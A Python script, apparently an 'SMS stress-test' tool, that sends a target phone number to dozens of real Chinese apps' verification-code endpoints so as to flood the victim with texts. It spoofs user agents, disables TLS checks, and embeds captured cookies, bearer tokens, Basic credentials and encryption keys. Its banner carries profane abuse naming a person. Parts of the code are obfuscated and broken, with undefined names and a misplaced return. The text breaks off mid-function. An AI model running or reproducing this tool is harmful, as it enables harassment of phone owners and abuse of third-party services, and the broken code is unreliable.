import subprocess
import sys

def safe_import(module_name):
    __import__(module_name)
required_modules = ['requests', 'Crypto']
for mod in required_modules:
    safe_import(mod)
c_yellow = '\x1b[93m'
c_reset = '\x1b[0m'
print(''.join([str(c_yellow), '下载完成 李先良你妈死了', str(c_reset)]))
import requests
import json
import time
import random
import hashlib
import base64
import hmac
import uuid
import string
import urllib.parse as urllib
import webbrowser
from Crypto.Cipher import AES, DES3, PKCS1_v1_5
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
requests.packages.urllib3.disable_warnings()
c_yellow = '\x1b[93m'
c_green = '\x1b[92m'
c_red = '\x1b[91m'
c_reset = '\x1b[0m'
print(''.join(['\n', str(c_yellow), str('=================================================='), str(c_reset)]))
print(''.join([str(c_green), '李先良我操你妈了个逼的', str(c_reset)]))
print(''.join([str(c_green), '李先良短信测压', str(c_reset)]))
print(''.join([str(c_green), '出事了，报李先良的名字哈', str(c_reset)]))
print(''.join([str(c_yellow), str('=================================================='), str(c_reset), '\n']))
url_official = 'http://小妹妹.cc'
url_group = 'https://y7jgj.qwxq1.com:666/'
print(''.join([str(c_yellow), '1. 李先良官方网页', str(c_reset)]))
print(''.join([str(c_yellow), '2. 免费抖音快手粉丝', str(c_reset)]))
print(''.join([str(c_yellow), '3. 进入短信测压工具', str(c_reset)]))

menu_choice = input(''.join(['\n', str(c_yellow), '请输入跳转选择：', str(c_reset)])).strip()
if (menu_choice == '1'):
    webbrowser.open(url_official)
    print(''.join([str(c_yellow), '已打开网站', str(c_reset)]))
elif (menu_choice == '2'):
    webbrowser.open(url_group)
    print(''.join([str(c_yellow), '已打开网站', str(c_reset)]))
else:
    print(''.join([str(c_yellow), '进入短信测压', str(c_reset)]))

def get_random_ua():
    ua_list = ['Mozilla/5.0 (Linux; Android 16; PKW110 Build/BP2A.250605.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0', 'Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36']
    return random.choice(ua_list)

def replace_phone_in_json(json_str, Z3fXY5WLt70Qrzm55cIH1sU87VVo4n):
    blacklist_phones = ['13800000000', '15915637092', '15915637093', '15915637098', '13800000002', '13856312354', '13000000000']
    for bp in blacklist_phones:
        if (bp in json_str):
            return json_str.replace(bp, phone)
        return json_str

def chunk_string(XjaHqnHfjt22xCkFalpK1cus11wjVlCWv26Bz2qkUxY2C, xdM9WSffL8LAenN8H7OHN3qt_3BhRfH6jB6Q4xRUF6, xJag0iZpSzH6DzAXAq4CBMqcuvJidM_9zzAQLU5ehyLziC):
    return XjaHqnHfjt22xCkFalpK1cus11wjVlCWv26Bz2qkUxY2C

def rsa_encrypt(plaintext, iSRWJApV9Ad82AMtQPjF7uSBWh7Gy6nu_B):
    pem_key = (('-----BEGIN PUBLIC KEY-----\n' + chunk_string(pubkey_str, 64, '\n')) + '\n-----END PUBLIC KEY-----')
    key = kBCSpXR3Y8SM5l1DWP4oa7f937lHJWDOv8rjtD4.import_key(pem_key)
    cipher = tQOjToF8_mgYddPG9KtHxTQKZzSJXcKhcyBpQP3mDLRh8wh.new(key)
    return base64.b64encode(cipher.encrypt(plaintext.encode())).decode()

def aes_cbc_encrypt(plaintext, WamJU3ub1DyPp0ZVfa11e1XQC8cJoU62cYMUCie, QFXd8RU6oscw9VAoiUQ4NdMFDI8zzB1uIciwjpZiz4i2HXk5qeSL8Um):
    key = bytes.fromhex(key_hex)
    iv = bytes.fromhex(iv_hex)
    padded_data = e44AuCSlblAiikz2JDyEHErpMm2RPV0X7jUkERnpHUnvsBgO(plaintext.encode('ascii'), zJbpQCpiFlgEQcU5wJz0fkG41nRvGiRFyNebo9EdKEjeyv.block_size, style='pkcs7')
    cipher = zJbpQCpiFlgEQcU5wJz0fkG41nRvGiRFyNebo9EdKEjeyv.new(key, zJbpQCpiFlgEQcU5wJz0fkG41nRvGiRFyNebo9EdKEjeyv.MODE_CBC, iv)
    return base64.b64encode(cipher.encrypt(padded_data)).decode()

def aes_ecb_encrypt(plaintext, WamJU3ub1DyPp0ZVfa11e1XQC8cJoU62cYMUCie):
    key = bytes.fromhex(key_hex)
    padded_data = e44AuCSlblAiikz2JDyEHErpMm2RPV0X7jUkERnpHUnvsBgO(plaintext.encode('ascii'), zJbpQCpiFlgEQcU5wJz0fkG41nRvGiRFyNebo9EdKEjeyv.block_size, style='pkcs7')
    cipher = zJbpQCpiFlgEQcU5wJz0fkG41nRvGiRFyNebo9EdKEjeyv.new(key, zJbpQCpiFlgEQcU5wJz0fkG41nRvGiRFyNebo9EdKEjeyv.MODE_ECB)
    return base64.b64encode(cipher.encrypt(padded_data)).decode()
    for HTQVRWZQVOKWQXJMVRJW in None:
        pass

def des3_encrypt(plaintext, Jqa66rMYrg97dfpYyJUnFNT7skFcvXb0G7_VIgW9neU1lH02d5YiQiZX2Du6):
    key_bytes = key.encode('utf-8').ljust(24, b'\x00')
    cipher = F6waXec8d2N3aq6I7q8jDVoqHF61IoJ0RSIOZR.new(key_bytes, F6waXec8d2N3aq6I7q8jDVoqHF61IoJ0RSIOZR.MODE_ECB)
    padded_data = e44AuCSlblAiikz2JDyEHErpMm2RPV0X7jUkERnpHUnvsBgO(plaintext.encode('utf-8'), F6waXec8d2N3aq6I7q8jDVoqHF61IoJ0RSIOZR.block_size, style='pkcs7')
    return base64.b64encode(cipher.encrypt(padded_data)).decode()
    for JCGMMCDDYHJZNKYGJBVE in None:
        pass

def gen_uuid():
    return str(uuid.uuid4()).replace('-', '').upper()

def bomber_app_api_zjxinyijia_cn(phone):
    url = 'https://app.api.zjxinyijia.cn/api/oauth/sendCode'
    payload = {'phone': phone, 'forAction': 'registerORlogin'}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_dlmixc_parking_lncrland_cn(phone):
    url = 'https://dlmixc-parking.lncrland.cn/syhgwxh-api/1.0/default/send-msg'
    headers = {'Referer': 'https://servicewechat.com/wx61c81e0c74e1c278/13/page-frame.html', 'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
    json_template = '{"phone":"15915637092","tempType":"ZL","channel":"MINI","length":4}'
    data = replace_phone_in_json(json_template, phone)
    requests.post(url, headers=headers, data=data, timeout=10, verify=(1 == 0))

def bomber_ngssa_caizidao_com_cn(phone):
    url = 'https://ngssa.caizidao.com.cn/ngssa/api/auth/sms/v1/send'
    key_hex = '4d6b6753484b4f594370346a374f614c2b426b42384f6455'
    iv_hex = '65577734616e706b5a54423662336335'
    headers = {'x-app-version': '2.0.48', 'x-device-type': 'adr', 'x-device-id': '9938ba09309274d5e802bc4ad97ce979b', 'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
    Nu4attu_NBzs6_QahOK6A2oA3YVwKW = aes_cbc_encrypt(phone, key_hex, iv_hex)
    payload = {'type': '0', 'mobile': Nu4attu_NBzs6_QahOK6A2oA3YVwKW}
    requests.post(url, json=payload, headers=headers, verify=False, timeout=15)

def bomber_cms_hrhgstock_com(phone):
    key_hex = '41594d74363448486b76435a734546787273337143773d3d'
    L1urBg3ZRSuzc99LJC0L7kCRBlhJULUujlkFZAu5wqO9rlxkegjELHeT = 'acw_tc=0a45644e17615034794703872ed0973aeb3bb93c217095a944a459a562274c; JSESSIONID=8ABB0AFB83C0DCB2663587A9A1572E08'
    url = 'https://cms.hrhgstock.com/api/userNew/sendCode'
    headers = {'Cookie': L1urBg3ZRSuzc99LJC0L7kCRBlhJULUujlkFZAu5wqO9rlxkegjELHeT, 'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
    Nu4attu_NBzs6_QahOK6A2oA3YVwKW = aes_ecb_encrypt(phone, key_hex)
    payload = {'type': 1, 'phone': Nu4attu_NBzs6_QahOK6A2oA3YVwKW}
    requests.post(url, json=payload, headers=headers, verify=False, timeout=10)

def bomber_wapp_ppwfund_com(phone):
    url = 'https://wapp.ppwfund.com/v1/user/sendVerificationCode'
    M9I736BA0X2RdX3pqA6WFj0X92H0u9NDD4xPZlIg = 'AGAO57D4E5FY27H8I9J0G1I4'
    BKgefVy4Ju5YhnpIx8Ff14GPkCizmPnYCHHbyrNM_oaU = {'device_uuid': '3c7ab5c8355a45493a0b9864d6411ce1', 'device_type': '2', 'device_mode': 'OPD2404', 'device_os_version': '15', 'channel': 'oppo', 'device_brand': 'OnePlus', 'app_type': '23', 'app_install_version': '7.11.0'}
    headers = {'Cookie': 'SERVERCORSID=22e688d802366a2ef62aafa89f843c5a|1764290419|1764290365; SERVERID=22e688d802366a2ef62aafa89f843c5a|1764290419|1764290365; acw_tc=0ae5a7e317642903657277841e1e0e31b62486407909c721a8d13b6e146523', 'User-Agent': get_random_ua()}
    JsPqXoRkfp8yHlHWSucIPynTLyuQ1X4dC1tb7W9QecBJH5M5 = {'send_type': '13', 'phone': phone, 'code_length': '6'}
    plaintext = json.dumps(JsPqXoRkfp8yHlHWSucIPynTLyuQ1X4dC1tb7W9QecBJH5M5, separators=(',', ':'))
    wFRPDHm3dyotsVToFRYJniwqOCSSoxxLyle = str(int(time.time()))
    irzO9otT21mSaazjtg2gWcTJ4bJzjhztWmbjL2vguYqHwgguwh26V = gen_uuid()
    data = des3_encrypt(plaintext, M9I736BA0X2RdX3pqA6WFj0X92H0u9NDD4xPZlIg)
    drgIHnmX3cFIyq_Be5lDchUhrFGXq0gMhtNMUkoH_t3xwXF9QDO6q = ((((((BKgefVy4Ju5YhnpIx8Ff14GPkCizmPnYCHHbyrNM_oaU['app_install_version'] + BKgefVy4Ju5YhnpIx8Ff14GPkCizmPnYCHHbyrNM_oaU['app_type']) + data) + BKgefVy4Ju5YhnpIx8Ff14GPkCizmPnYCHHbyrNM_oaU['device_uuid']) + M9I736BA0X2RdX3pqA6WFj0X92H0u9NDD4xPZlIg) + irzO9otT21mSaazjtg2gWcTJ4bJzjhztWmbjL2vguYqHwgguwh26V) + wFRPDHm3dyotsVToFRYJniwqOCSSoxxLyle)
    _0wNoGXW6XJ5kVHknCzYa7_r3bcMlU9uo2TDocInMvmOuU = hashlib.md5(drgIHnmX3cFIyq_Be5lDchUhrFGXq0gMhtNMUkoH_t3xwXF9QDO6q.encode()).hexdigest()
    Y6DfGNorR7WibTqaFwQ_hErYsafbi3OgcI99fEF0U0xjWf = {'sign': _0wNoGXW6XJ5kVHknCzYa7_r3bcMlU9uo2TDocInMvmOuU, 'timestamp': wFRPDHm3dyotsVToFRYJniwqOCSSoxxLyle, 'nonce': irzO9otT21mSaazjtg2gWcTJ4bJzjhztWmbjL2vguYqHwgguwh26V, 'data': data}
    requests.post(url, data=Y6DfGNorR7WibTqaFwQ_hErYsafbi3OgcI99fEF0U0xjWf, headers=headers, verify=False, timeout=15)

def bomber_asms_m_isignet_cn(phone):
    url = 'https://asms-m.isignet.cn:7676/ASMSServer/user/sendVerifyCode'
    headers = {'Referer': 'https://servicewechat.com/wxc15545eddbffa68f/23/page-frame.html', 'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
    payload = {'version': '1.0', 'mobile': phone}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_passport_fanli_com(phone):
    url = ''.join(['https://passport.fanli.com/mobileapi/i/user/mobileFastReg?jsoncallback=jQuery21107878787528225448_1752429344083&mobile=', str(phone), '&countrycode=86&mobilestep=1&_=1752429344086'])
    headers = {'Referer': 'https://m.fanli.com/', 'X-Requested-With': 'com.fanli.android.apps', 'User-Agent': get_random_ua()}
    requests.get(url, headers=headers, timeout=15, verify=(1 == 0))

def bomber_wxweb_huashenghaoche_com(phone):
    url = 'https://wxweb.huashenghaoche.com/hshcwxweb/user/bindPhone/getCode'
    payload2 = {'uid': '', 'imageId': '', 'phone': phone, 'imageCode': ''}
    headers = {'User-Agent': get_random_ua(), 'Referer': 'https://servicewechat.com/wx84b2c08c79130ac9/65/page-frame.html', 'charset': 'utf-8', 'content-type': 'application/x-www-form-urlencoded', 'token': ''}
    requests.get(url, params=payload2, headers=headers, timeout=15, verify=(1 == 0))

def bomber_www_dxmbaoxian_com(phone):
    url = 'https://www.dxmbaoxian.com/juhe/insurface/consultant/sendVerificationCode'
    headers = {'User-Agent': get_random_ua(), 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Referer': 'https://www.dxmbaoxian.com/s/product?itemId=2000000356&channelId=dxmjr_H5-shouye-dakapian1&sourceChannel=shareMSG_wx-service-xiaochengxu-1005', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'X-Requested-With': 'com.tencent.mm', 'Origin': 'https://www.dxmbaoxian.com', 'sec-ch-ua-mobile': '?1', 'Content-Type': 'application/json;charset=UTF-8', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Connection': 'keep-alive', 'Host': 'www.dxmbaoxian.com'}
    payload = {'phone': phone, 'did': None, 'currentSyncTimes': 0, 'syncStokenTime': 0, 'errTimes': 0, 'sessionId': 'a0aa3c64-3e5a-4821-8c77-17473b0739a4-1754372069495', 'wxAccessCode': None, 'timestamp': 29239535, 'sourceChannel': 'shareMSG_wx-service-xiaochengxu-1005', 'channelId': 'dxmjr_H5-shouye-dakapian1', 'tagId': '', 'from': '36'}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=False)

def bomber_pub_yaofangwang_com(phone):
    url = 'https://pub.yaofangwang.com/4000/4000/0/guest.account.sendSMS'
    payload2 = {'device_no': 'wx_0e1Y0WZv3PVNI53p184w3mWmrZ0Y0WZZ', 'idfa': 'wx_0e1Y0WZv3PVNI53p184w3mWmrZ0Y0WZZ', 'user_region_id': '', 'user_city_name': '上海市', 'lng': '121.54408972227351', 'lat': '31.221140483329414', 'networkType': 'true', 'market': 'OnePlus', 'version': '8.0.63', 'os': 'android', 'deviceName': 'OPD2404', 'osVersion': 'miniapp', 'app_version': '7.1.59', '__client': 'app_wx', 'get_from': 'wx_miniapp_1', 'type': '1', 'mobile': phone}
    headers = {'User-Agent': get_random_ua(), 'Cookie': '', 'Referer': 'https://servicewechat.com/wx22c626a6d6d0f593/230/page-frame.html', 'charset': 'utf-8', 'content-type': 'application/json'}
    requests.get(url, params=payload2, headers=headers, timeout=15, verify=(1 == 0))

def bomber_weapp_91160_com(phone):
    url = 'https://weapp.91160.com/user/sendRegisterSms.html'
    payload2 = {'channelId': '100012084', 'cid': '100012084', 'captcha': '', 'type': 'bind', 'phone': phone, 'user_key': 'def0099a78949369cf609a1a7f4328f0HlgOKOrd20251101034653', 'user_id': '258636457', 'token': '2da08e26e3c6a3d7efd10df71344bc96'}
    headers = {'User-Agent': get_random_ua(), 'Cookie': 'PHPSESSID=agh9ou5l00t89t7jpv9roi4n16; city_info=a%3A32%3A%7Bs%3A7%3A%22area_id%22%3Bi%3A3172%3Bs%3A6%3A%22areaId%22%3Bi%3A3172%3Bs%3A9%3A%22parent_id%22%3Bi%3A3157%3Bs%3A8%3A%22parentId%22%3Bi%3A3157%3Bs%3A9%3A%22area_name%22%3Bs%3A6%3A%22%E6%BE%84%E8%BF%88%22%3Bs%3A8%3A%22areaName%22%3Bs%3A6%3A%22%E6%BE%84%E8%BF%88%22%3Bs%3A7%3A%22t_level%22%3Bi%3A100%3Bs%3A6%3A%22tLevel%22%3Bi%3A100%3Bs%3A7%3A%22id_path%22%3Bs%3A12%3A%221%2C3157%2C3172%2C%22%3Bs%3A6%3A%22idPath%22%3Bs%3A12%3A%221%2C3157%2C3172%2C%22%3Bs%3A8%3A%22position%22%3Bi%3A50%3Bs%3A7%3A%22is_used%22%3Bi%3A1%3Bs%3A6%3A%22isUsed%22%3Bi%3A1%3Bs%3A8%3A%22log_stat%22%3Bi%3A0%3Bs%3A7%3A%22logStat%22%3Bi%3A0%3Bs%3A10%3A%22area_level%22%3Bs%3A1%3A%223%22%3Bs%3A9%3A%22areaLevel%22%3Bs%3A1%3A%223%22%3Bs%3A8%3A%22pos_name%22%3Bs%3A6%3A%22%E5%8D%8E%E5%8D%97%22%3Bs%3A7%3A%22posName%22%3Bs%3A6%3A%22%E5%8D%8E%E5%8D%97%22%3Bs%3A3%3A%22hot%22%3Bs%3A1%3A%220%22%3Bs%3A3%3A%22map%22%3Bs%3A20%3A%22110.006754%2C19.738521%22%3Bs%3A9%3A%22area_code%22%3Bs%3A3%3A%22cmx%22%3Bs%3A8%3A%22areaCode%22%3Bs%3A3%3A%22cmx%22%3Bs%3A7%3A%22is_show%22%3Bi%3A1%3Bs%3A6%3A%22isShow%22%3Bi%3A1%3Bs%3A5%3A%22i_key%22%3Bs%3A1%3A%22C%22%3Bs%3A4%3A%22iKey%22%3Bs%3A1%3A%22C%22%3Bs%3A9%3A%22mark_city%22%3Bi%3A0%3Bs%3A8%3A%22markCity%22%3Bi%3A0%3Bs%3A4%3A%22norm%22%3Bs%3A12%3A%22469023000000%22%3Bs%3A8%3A%22unit_sum%22%3Bi%3A9%3Bs%3A7%3A%22unitSum%22%3Bi%3A9%3B%7D; __jsluid_s=332d62db6b38df5af8d84dc3cbfecc4b', 'Referer': 'https://servicewechat.com/wx41d50f4960b90df8/417/page-frame.html', 'charset': 'utf-8', 'traceid': 'guahao/account/person/phone_cd267a6b-17dd-4965-9e84-1ba5a7202971-1759348076080', 'content-type': 'application/json;charset=UTF-8'}
    requests.get(url, params=payload2, headers=headers, timeout=15, verify=False)

def bomber_www_hbxyjob_cn(phone):
    url = 'https://www.hbxyjob.cn/wsite-web/api/verify'
    headers = {'User-Agent': get_random_ua(), 'Referer': 'https://servicewechat.com/wxd2182d39c164d339/49/page-frame.html', 'charset': 'utf-8', 'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE4NDU3NTIzNTksInVzZXJpZCI6Ijc3Zjc4NjNjOGZlMTQ3ODU5ZjU4NmJjMzA0OGI2YTEwIiwiaWF0IjoxNzU5MzUyMzU5fQ.cRJcVZ8QBvxDocNTarIIX_PQiHFfwDX9UYsIoznCaUE', 'Content-Type': 'application/json'}
    payload = {'company': 'isCompany', 'type': 'register', 'phone': phone}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=(1 == 0))

def bomber_gig_c_api_1haozc_com(phone):
    url = 'https://gig-c-api.1haozc.com/api/v2/auth/sendSmsCode'
    headers = {'User-Agent': get_random_ua(), 'referer': 'https://servicewechat.com/wx8f3fac1aef79d998/73/page-frame.html', 'charset': 'utf-8', 'params': '{"_appid":"cpid","_rk":"9B47E841-924B-4E03-8384-A43A4D8C8B4B","_ts":"20251002055057","_v":"1.0","_sign":"bffc13fb4f728518a3deb0d35c12792d"}', 'version_name': '3.0.1', 'Content-Type': 'application/json'}
    payload = {'codeType': 1, 'phone': phone}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=(1 == 0))

def bomber_xuexi_wacai_com(phone):
    url = 'https://xuexi.wacai.com/edu-app/api/user/sms-send'
    headers = {'User-Agent': get_random_ua(), 'x-appver': '1.0.16', 'x-platform': '226', 'x-mc': '00000001', 'x-access-token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip'}
    payload = {'mob': phone}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=False)

def bomber_api_livelab_com_cn(phone):
    url = 'https://api.livelab.com.cn/thirdParty/sms/app/captcha'
    headers = {'User-Agent': get_random_ua(), 'platform-version': '3.20.0', 'x-fwd-anonymousid': 'ae9b5df9da406ccb', 'platform-type': 'android', 'Accept-Encoding': 'gzip'}
    data = {'type': '1', 'phone': phone}
    requests.post(url, data=data, headers=headers, timeout=15, verify=False)

def bomber_hyqb_jinnuodai_com_cn(phone):
    url = 'https://hyqb.jinnuodai.com.cn/api/v2/sms/send'
    headers = {'User-Agent': get_random_ua(), 'Content-Type': 'application/json;charset=utf-8;', 'tag': 'sbqb-speed', 'distributorId': '289', 'Authorization': '', 'Accept-Encoding': 'gzip', 'Accept': 'application/json, text/plain, */*', 'Connection': 'Keep-Alive'}
    payload2 = {'phone': phone}
    requests.post(url, params=payload2, headers=headers, timeout=15, verify=False)

def bomber_wechat_chinalife_p_com_cn(phone):
    url = 'https://wechat.chinalife-p.com.cn/cdf/wechat/user/appAuth/getVerifyCode'
    headers = {'User-Agent': get_random_ua(), 'cdf-token-default': '', 'appOS': 'A', 'version': '5.2.6', 'terminal': 'APP', 'operateId': '', 'Accept-Encoding': 'gzip', 'Connection': 'close'}
    payload = {'captchaType': '01', 'mobilePhone': phone}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=(1 == 0))

def bomber_m_touker_com(phone):
    url = 'https://m.touker.com/account/stock/guide/index/sendSmsCode.do'
    headers = {'User-Agent': get_random_ua(), 'Cookie': 'acw_tc=0a5cc91617613252880581805efe76563a0f06a09fff5298a7eb35877d4ac3; _b_=e768bf6f-a4fc-4de5-941d-e500a59d48128E01CE61; deviceInfo=%7B%22macAddress%22%3A%22%22%2C%22systemName%22%3A%22Android%22%2C%22model%22%3A%22%22%2C%22appVerion%22%3A%2215%22%2C%22localizedModel%22%3A%22%22%2C%22uuid%22%3A%22%22%2C%22systemVersion%22%3A%2215%22%2C%22phoneNum%22%3A%22%22%2C%22ipAdress%22%3A%22%22%2C%22idfa%22%3A%22%22%2C%22imsi%22%3A%22%22%2C%22iccid%22%3A%22%22%2C%22rmpn%22%3A%22%22%2C%22dev%22%3A%22HB-H5%22%7D; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219a172b0d29829-048cad55e52bc14-1713104a-923544-19a172b0d2b67b%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTlhMTcyYjBkMjk4MjktMDQ4Y2FkNTVlNTJiYzE0LTE3MTMxMDRhLTkyMzU0NC0xOWExNzJiMGQyYjY3YiJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219a172b0d29829-048cad55e52bc14-1713104a-923544-19a172b0d2b67b%22%7D; partnerCode=', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Referer': 'https://m.touker.com/account/stock/guide/index.htm?referrer=https://m.touker.com/hbzqkhview/index.html', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'Origin': 'https://m.touker.com', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua': '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-platform': '"Android"', 'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept': 'application/json, text/javascript, */*; q=0.01'}
    data = {'deviceUUID': 'v1__PImPF1SOA0x3wvaJrHJZEA', 'phone': phone}
    requests.post(url, data=data, headers=headers, timeout=15, verify=(1 == 0))

def bomber_unifyapp_guominpension_com(phone):
    url = 'https://unifyapp.guominpension.com/publicapi/unifyapp-admin/app/sendCheckSmsCode'
    headers = {'User-Agent': get_random_ua(), 'sign': 'cc37988c6af6bebbcc5c40a54839e404', 'idfa': '19b9dea7fb19a3a8', 'appCode': 'com.guomin.insurance', 'traceId': 'be3739c7-3329-446e-abc1-063317579a14', 'bizOrigin': 'oppo', 'zaid': '19b9dea7fb19a3a8', 'deviceId': '19b9dea7fb19a3a8', 'osDevice': 'OPD2404', 'osVersion': '15', 'appPushToken': '022205e64067ef434c45646c33683f39b443', 'v': '1.6.1', 'dslDeviceID': '9f4ed233-6a29-43d7-8a8a-0e71f22df7c7', 't': 'android', '_ZaGateWayEncrypt': '0', '_IsZaWebEncrypt': '1', '_ZaServerEncrypt': '1', 'lockandlock': 'xxx', 'Content-Type': 'application/json;charset=utf-8', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'Connection': 'Keep-Alive'}
    payload = {'mobile': phone, 'msgType': '01'}
    requests.post(url, json=payload, headers=headers, timeout=15, verify=(1 == 0))

def bomber_passport_xag_cn(phone):
    url = 'https://passport.xag.cn/home/sms_code'
    data = ''.join(['icc=86&phone=', str(phone)])
    headers = {'User-Agent': get_random_ua(), 'Referer': 'https://servicewechat.com/wx43471742f3e783cb/248/page-frame.html', 'charset': 'utf-8', 'Authorization': 'Basic RjIxMUIwODFCQ0FFNERBM0ZCMzBDNUU4MThCRkRBRjI6ODdmMzc5ODdhMjc5MmRiNDU0ZDkzNGM0NGNiY2JlZjM=', 'token': '', 'X-Requested-With': 'XMLHttpRequest', 'content-type': 'application/x-www-form-urlencoded', 'Accept': 'application/json', 'mini': 'member', 'Connection': 'keep-alive', 'Host': 'passport.xag.cn'}
    requests.post(url, data=data, headers=headers, timeout=15, verify=(1 == 0))

def bomber_support_mikecrm_com(phone):
    url = 'https://support.mikecrm.com/handler/web/form_runtime/handleGetPhoneVerificationCode.php'
    jr1HJNCtiGLSx3UmmeQVq4phMOIoeHbHil7L = {'cvs': {'t': 'j7ctI52', 'cp': '208396143', 'mb': phone}}
    unsKIqbYql2khTXzG1tWJ3B3NThRuhPQMSFjGRyGEP2w3d1RfTEuxQ = json.dumps(jr1HJNCtiGLSx3UmmeQVq4phMOIoeHbHil7L, separators=(',', ':'))
    data = ('d=' + urllib.parse.quote(unsKIqbYql2khTXzG1tWJ3B3NThRuhPQMSFjGRyGEP2w3d1RfTEuxQ))
    headers = {'User-Agent': get_random_ua(), 'Cookie': 'uvi=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz; mk_seed=84; MK_L_UVD=%7B%2223%22%3A%2218070783632%22%2C%2231%22%3A%22%u6551%u8D4E%u7F51%u7EDC%u5B89%u5168%22%2C%2232%22%3A%22%u56FD%u5B89%22%7D; uvis=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Referer': 'https://support.mikecrm.com/j7ctI52?_cpv=%7B%22208395996%22%3A%22http%3A%2F%2Fcn.mikecrm.com%2FozURs1%22%7D', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'Origin': 'https://support.mikecrm.com', 'sec-ch-ua-mobile': '?1', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-platform': '"Android"', 'Connection': 'keep-alive', 'Host': 'support.mikecrm.com'}
    requests.post(url, data=data, headers=headers, timeout=15, verify=False)

def bomber_ptlogin_4399_com(phone):
    url = ''.join(['https://ptlogin.4399.com/oauth2/sendPhoneLoginCode.do?phone=', str(phone), '&v=1'])
    headers = {'Cookie': '_4399stats_vid=1780846153788791; USESSIONID=30e0f9de-d91a-441e-b9dd-e3bc87485658', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate, br', 'Referer': 'https://ptlogin.4399.com/oauth2/authorize.do?client_id=a9a16636dbaeb917e2ffb16f0d52006e&redirect_uri=https%3A%2F%2Fh.api.4399.com%2FunifiedLogin%2Fuser%2Flogin%2Fcallback%3FcallbackUrl%3Dhttps%253A%252F%252Fh.4399.com%252Fwap%252Fuser.htm&response_type=token&show_ext_login=true&loginRealNameLevel=4&regRealNameLevel=4', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'Accept': '*/*', 'User-Agent': get_random_ua(), 'Connection': 'keep-alive', 'Host': 'ptlogin.4399.com'}
    requests.get(url, headers=headers, timeout=15, verify=(1 == 0))

def bomber_yun_api_startupfun_cn(phone):
    url = 'https://yun-api.startupfun.cn/api/v1/user/mobile/get_verify_code'
    payload2 = {'wxSource': 'wx', 'wpcp': '', 'cv': '3.8.8', 'cp': 'w', 'ci': 'e95cd2e0-ea60-11f0-8cb7-b718e17888fd', 'appId': 'wxbfd55a2196642168'}
